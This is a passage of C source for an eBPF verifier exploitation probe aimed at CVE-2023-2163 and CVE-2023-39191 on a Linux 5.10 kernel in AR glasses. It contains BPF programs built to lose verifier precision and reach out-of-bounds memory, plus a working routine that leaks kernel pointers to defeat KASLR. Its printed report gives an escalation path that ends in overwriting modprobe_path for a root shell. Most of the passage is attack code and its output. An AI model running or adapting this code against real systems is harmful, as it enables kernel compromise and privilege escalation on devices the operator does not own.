// Vulnerability Probe #7: Precision Propagation Bug
//
// Related to CVE-2023-2163: The verifier needs to track which registers
// require "precision" (exact bounds). A bug in precision propagation
// can lead to incorrect state pruning.
// ============================================================================

static int probe_precision_bug(int map_fd, char *log_buf, int log_size)
{
    printf("\n[PROBE 7] Precision Propagation Attack\n");
    printf("────────────────────────────────────────\n");

    /*
     * PRECISION BUG EXPLANATION:
     * ──────────────────────────
     * The verifier marks registers as "precise" when they're used for:
     * - Pointer arithmetic
     * - Conditional jumps
     * - Memory access bounds
     *
     * If precision marking is incomplete, the verifier might prune
     * a state where a register has wide bounds, accepting narrow bounds.
     *
     * Attack: Create a chain of operations that loses precision tracking.
     */

    struct bpf_insn prog[] = {
        // Setup
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 26),
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

        // Load user value
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_9, 0),

        // Create a long chain of operations that might lose precision
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 0xFF), // [0,255]

        // ══ PRECISION LOSS CHAIN ══
        // Spill to stack - precision should follow
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_7, -16),

        // Do unrelated operations (might affect precision tracking)
        BPF_MOV64_IMM(BPF_REG_8, 0x1234),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x5678),
        BPF_ALU64_IMM(BPF_XOR, BPF_REG_8, 0xFFFF),

        // More stack operations
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -24),
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_10, -24),

        // Fill from stack - does precision survive?
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_10, -16),

        // Additional transform
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_7),
        BPF_ALU64_IMM(BPF_RSH, BPF_REG_8, 4), // /16
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 4), // *16 (align)

        // Use for memory access
        BPF_JMP_IMM(BPF_JGT, BPF_REG_8, 240, 5), // "Safety" check

        BPF_ALU64_REG(BPF_ADD, BPF_REG_9, BPF_REG_8),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                            sizeof(prog) / sizeof(prog[0]),
                            log_buf, log_size);

    if (prog_fd >= 0)
    {
        printf("[!!!] Precision propagation may be vulnerable!\n");
        close(prog_fd);
        return 1;
    }
    else
    {
        printf("[OK] Precision tracking appears correct\n");
        if (log_buf[0])
            printf("[LOG] %.400s...\n", log_buf);
        return 0;
    }
}

// ============================================================================
// Vulnerability Probe #8: KASLR Bypass via Map Pointer Leak
//
// If we can load a BPF program, we can potentially leak kernel
// addresses through the map value pointer stored in registers.
// ============================================================================

static int probe_kaslr_bypass(int map_fd, char *log_buf, int log_size)
{
    printf("\n[PROBE 8] KASLR Bypass - Map Pointer Arithmetic\n");
    printf("─────────────────────────────────────────────────\n");

    /*
     * KASLR BYPASS TECHNIQUE:
     * ───────────────────────
     * Even without CVE-2023-2163, we can try to leak kernel addresses:
     *
     * 1. BPF map values are stored in kernel memory
     * 2. After map_lookup_elem(), r0 contains kernel pointer
     * 3. If we can store this pointer to the map itself, we leak it!
     *
     * Kernel address gives us:
     * - Slab cache base (for heap spray)
     * - Estimate of kernel text base (KASLR slide)
     */

    struct bpf_insn prog[] = {
        // ═══ Get map value pointer ═══
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0), // key = 0
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 7),

        // ═══ r6 = kernel pointer to map value! ═══
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // ═══ Store the pointer value into the map ═══
        // This is the key operation - store kernel address to userspace-readable location
        // *(u64*)(r6 + 0) = r6
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_6, 0),

        // Also store at offset 8 for verification
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_6, 8),

        // Return success
        BPF_MOV64_IMM(BPF_REG_0, 0x1337),
        BPF_EXIT_INSN(),

        // NULL check fail
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                            sizeof(prog) / sizeof(prog[0]),
                            log_buf, log_size);

    if (prog_fd < 0)
    {
        printf("[!] Cannot load KASLR probe: %s\n", strerror(errno));
        if (log_buf[0])
            printf("[LOG] %.300s\n", log_buf);
        return 0;
    }

    printf("[+] KASLR probe loaded (fd=%d)\n", prog_fd);

    // Create socket and attach
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0)
    {
        printf("[!] socketpair failed\n");
        close(prog_fd);
        return 0;
    }

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF,
                   &prog_fd, sizeof(prog_fd)) < 0)
    {
        printf("[!] Cannot attach: %s\n", strerror(errno));
        close(prog_fd);
        close(socks[0]);
        close(socks[1]);
        return 0;
    }

    // Initialize map with marker values
    uint32_t key = 0;
    uint64_t values[32];
    for (int i = 0; i < 32; i++)
    {
        values[i] = 0xCAFEBABE00000000ULL | i;
    }
    map_update(map_fd, &key, values);

    // Trigger the BPF program
    char msg[] = "trigger_kaslr_leak";
    send(socks[1], msg, sizeof(msg), 0);

    // Small delay for processing
    usleep(10000);

    // Read back the map
    map_lookup(map_fd, &key, values);

    printf("[*] Map contents after BPF execution:\n");
    for (int i = 0; i < 4; i++)
    {
        printf("    [%d] = 0x%016lx", i, values[i]);

        // Check if it looks like a kernel address
        if ((values[i] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
        {
            printf(" ← KERNEL ADDRESS!");
        }
        else if ((values[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)
        {
            printf(" ← KERNEL ADDRESS (ARM64)!");
        }
        printf("\n");
    }

    // Analyze leaked address
    uint64_t leaked_addr = values[0];
    if ((leaked_addr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
    {
        printf("\n╔════════════════════════════════════════════════════════════╗\n");
        printf("║  [!!!] KASLR BYPASS SUCCESSFUL!                            ║\n");
        printf("╠════════════════════════════════════════════════════════════╣\n");
        printf("║  Leaked kernel address: 0x%016lx              ║\n", leaked_addr);
        printf("║                                                            ║\n");

        // Estimate kernel base
        // Map values are typically in kernel heap (kmalloc/vmalloc)
        // We can use this to estimate module/kernel text range
        uint64_t page_base = leaked_addr & ~0xFFFULL;
        printf("║  Page-aligned base: 0x%016lx                  ║\n", page_base);

        // ARM64 kernel typically at 0xffffffc0XXXXXXXX or similar
        printf("║                                                            ║\n");
        printf("║  NEXT STEPS:                                               ║\n");
        printf("║  1. Use leaked address for heap spray targeting            ║\n");
        printf("║  2. Calculate kernel text offset from heap layout          ║\n");
        printf("║  3. Build arbitrary R/W using CVE-2024-36971              ║\n");
        printf("╚════════════════════════════════════════════════════════════╝\n");

        close(prog_fd);
        close(socks[0]);
        close(socks[1]);
        return 1;
    }

    printf("\n[?] No obvious kernel pointer leaked\n");
    printf("[*] Verifier may have prevented pointer storage\n");

    close(prog_fd);
    close(socks[0]);
    close(socks[1]);
    return 0;
}

// ============================================================================
// Main
// ============================================================================

static void print_banner(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2023-2163 / CVE-2023-39191 BPF Verifier Deep Probe               ║\n");
    printf("║  ─────────────────────────────────────────────────────────────────    ║\n");
    printf("║  Target: Linux Kernel 5.10.209 (Rokid AR Glasses)                     ║\n");
    printf("║  Focus:  Branch Pruning, Precision Tracking, KASLR Bypass            ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n");
}

static void check_bpf_config(void)
{
    printf("\n[*] BPF Configuration Analysis:\n");
    printf("────────────────────────────────\n");

    // unprivileged_bpf_disabled
    FILE *fp = fopen("/proc/sys/kernel/unprivileged_bpf_disabled", "r");
    if (fp)
    {
        int val = 1;
        fscanf(fp, "%d", &val);
        printf("    unprivileged_bpf_disabled = %d", val);
        if (val == 0)
        {
            printf("  [EXPLOITABLE: Non-root BPF allowed]\n");
        }
        else if (val == 1)
        {
            printf("  [Restricted: Root only]\n");
        }
        else
        {
            printf("  [Disabled permanently]\n");
        }
        fclose(fp);
    }

    // kptr_restrict
    fp = fopen("/proc/sys/kernel/kptr_restrict", "r");
    if (fp)
    {
        int val = 2;
        fscanf(fp, "%d", &val);
        printf("    kptr_restrict = %d", val);
        if (val == 0)
        {
            printf("              [Pointers visible]\n");
        }
        else if (val == 1)
        {
            printf("              [Hidden from non-root]\n");
        }
        else
        {
            printf("              [Hidden from all]\n");
        }
        fclose(fp);
    }

    // bpf_jit_enable
    fp = fopen("/proc/sys/net/core/bpf_jit_enable", "r");
    if (fp)
    {
        int val = 0;
        fscanf(fp, "%d", &val);
        printf("    bpf_jit_enable = %d", val);
        if (val == 1)
        {
            printf("           [JIT enabled - better performance]\n");
        }
        else if (val == 2)
        {
            printf("           [JIT + debug]\n");
        }
        else
        {
            printf("           [Interpreter mode]\n");
        }
        fclose(fp);
    }
}

int main(void)
{
    print_banner();

    // Check kernel version
    FILE *fp = fopen("/proc/version", "r");
    if (fp)
    {
        char buf[256];
        if (fgets(buf, sizeof(buf), fp))
        {
            printf("\n[*] Kernel: ");
            // Extract just the version
            char *ver = strstr(buf, "Linux version");
            if (ver)
            {
                printf("%s", ver);
            }
            else
            {
                printf("%s", buf);
            }
        }
        fclose(fp);
    }

    // UID info
    printf("[*] Running as: UID=%d, EUID=%d\n", getuid(), geteuid());

    check_bpf_config();

    // Check BPF availability
    printf("\n[*] Testing BPF syscall availability...\n");
    int test_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 4, 1);
    if (test_fd < 0)
    {
        printf("[!] BPF not available: %s\n", strerror(errno));
        printf("[!] Possible reasons:\n");
        printf("    - unprivileged_bpf_disabled=1/2\n");
        printf("    - SELinux/AppArmor blocking\n");
        printf("    - Kernel config missing BPF\n");
        return 1;
    }
    close(test_fd);
    printf("[+] BPF syscall functional!\n");

    // Create probe map (larger for OOB tests)
    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 256, 16);
    if (map_fd < 0)
    {
        printf("[!] Cannot create probe map: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Probe map created (fd=%d, value_size=256, entries=16)\n", map_fd);

    // Verifier log buffer
    char *log_buf = malloc(1 << 18); // 256KB log buffer
    if (!log_buf)
    {
        printf("[!] Cannot allocate log buffer\n");
        close(map_fd);
        return 1;
    }

    int vulns_found = 0;

    // Run probes
    printf("\n");
    printf("═══════════════════════════════════════════════════════════════════════\n");
    printf("                      VULNERABILITY PROBES                              \n");
    printf("═══════════════════════════════════════════════════════════════════════\n");

    // Probe 1: Branch Pruning
    memset(log_buf, 0, 1 << 18);
    vulns_found += probe_branch_pruning(map_fd, log_buf, 1 << 18);

    // Probe 2: ALU32 Confusion
    memset(log_buf, 0, 1 << 18);
    vulns_found += probe_alu32_confusion(map_fd, log_buf, 1 << 18);

    // Probe 3: Pointer Confusion
    memset(log_buf, 0, 1 << 18);
    vulns_found += probe_ptr_confusion(map_fd, log_buf, 1 << 18);

    // Probe 4: KASLR Leak (original)
    memset(log_buf, 0, 1 << 18);
    vulns_found += probe_kaslr_leak(map_fd, log_buf, 1 << 18);

    // Probe 5: JMP32 Bug
    memset(log_buf, 0, 1 << 18);
    vulns_found += probe_jmp32_bug(map_fd, log_buf, 1 << 18);

    // Probe 6: CVE-2023-2163 Exact Pattern
    memset(log_buf, 0, 1 << 18);
    vulns_found += probe_cve_2023_2163_exact(map_fd, log_buf, 1 << 18);

    // Probe 7: Precision Propagation
    memset(log_buf, 0, 1 << 18);
    vulns_found += probe_precision_bug(map_fd, log_buf, 1 << 18);

    // Probe 8: KASLR Bypass (advanced)
    memset(log_buf, 0, 1 << 18);
    vulns_found += probe_kaslr_bypass(map_fd, log_buf, 1 << 18);

    // Summary
    printf("\n");
    printf("═══════════════════════════════════════════════════════════════════════\n");
    printf("                           FINAL REPORT                                 \n");
    printf("═══════════════════════════════════════════════════════════════════════\n");
    printf("\n");

    if (vulns_found > 0)
    {
        printf("╔═════════════════════════════════════════════════════════════════════╗\n");
        printf("║  [!!!] %d POTENTIAL VULNERABILITY(IES) DETECTED!                    ║\n", vulns_found);
        printf("╠═════════════════════════════════════════════════════════════════════╣\n");
        printf("║                                                                     ║\n");
        printf("║  EXPLOITATION PATH:                                                 ║\n");
        printf("║  ──────────────────                                                 ║\n");
        printf("║  1. Use KASLR bypass to leak kernel heap address                   ║\n");
        printf("║  2. Calculate kernel text base from heap layout                    ║\n");
        printf("║  3. Use bounds confusion for arbitrary kernel read                 ║\n");
        printf("║  4. Locate modprobe_path or cred structure                         ║\n");
        printf("║  5. Achieve arbitrary write via combined primitives                ║\n");
        printf("║  6. Overwrite modprobe_path → root shell                           ║\n");
        printf("║                                                                     ║\n");
        printf("║  ALTERNATIVE: Combine with CVE-2024-36971 for dst_entry spray     ║\n");
        printf("╚═════════════════════════════════════════════════════════════════════╝\n");
    }
    else
    {
        printf("╔═════════════════════════════════════════════════════════════════════╗\n");
        printf("║  [OK] No CVE-2023-2163/39191 vulnerabilities detected               ║\n");
        printf("╠═════════════════════════════════════════════════════════════════════╣\n");
        printf("║                                                                     ║\n");
        printf("║  ANALYSIS:                                                          ║\n");
        printf("║  ─────────                                                          ║\n");
        printf("║  • Kernel 5.10.209 appears to have backported BPF fixes            ║\n");
        printf("║  • Verifier correctly tracks bounds through branches               ║\n");
        printf("║  • Precision propagation working as expected                       ║\n");
        printf("║                                                                     ║\n");
        printf("║  ALTERNATIVE ATTACK VECTORS:                                        ║\n");
        printf("║  ──────────────────────────                                         ║\n");
        printf("║  1. CVE-2024-36971 (dst UAF) - if route manipulation works         ║\n");
        printf("║  2. Boot.img modification via fastboot                             ║\n");
        printf("║  3. Other kernel vulnerabilities in 5.10.x series                  ║\n");
        printf("║  4. Check for vendor-specific drivers with bugs                    ║\n");
        printf("║                                                                     ║\n");
        printf("║  Run: `adb shell cat /proc/kallsyms | head` to check access       ║\n");
        printf("╚═════════════════════════════════════════════════════════════════════╝\n");
    }

    printf("\n");

    free(log_buf);
    close(map_fd);

    printf("[*] Probe complete. Exit code: %d\n", vulns_found > 0 ? 0 : 1);
    return vulns_found > 0 ? 0 : 1;
}
